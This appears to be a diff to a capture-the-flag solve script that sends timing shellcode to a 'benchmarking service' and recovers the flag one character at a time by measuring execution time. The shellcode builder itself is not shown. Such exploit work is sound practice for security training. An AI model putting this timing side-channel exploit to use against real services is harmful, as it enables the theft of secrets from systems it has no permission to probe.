@@ -70,23 +70,16 @@ def brute_force_flag():
                 else:
                     p = process(['python3', 'wrapper.py'], env=env)
 
+                shellcode = create_timing_shellcode(position, ord(character))
+
                 p.recv(utf8len("======= BENCHMARKING SERVICE V1.0 =======\n"))
                 p.recv(utf8len("Shellcode: "))
-                p.send(pad_payload(shellcode, 1024))
-                # Wait for prompt
-                p.recvuntil(b"Shellcode: ")
-
-                shellcode = create_timing_shellcode(position, ord(character))
-                
                 p.send(shellcode)
-                time_val = get_timing(p)
+                time_str = p.recvall().decode("utf-8").split("Time: ")[1].strip()
+                time_val = float(time_str)
                 p.close()
-                #output = p.recvall()
 
-                #time_str = output.split("Time: ")[1].strip()
-                #time_val = float(time_str)
                 log.info(f"Char '{character}': {time_val:.3f}s")
-
                 if time_val > 0.05:
                     flag += character
                     log.success(f"Found: '{character}' -> {flag}")
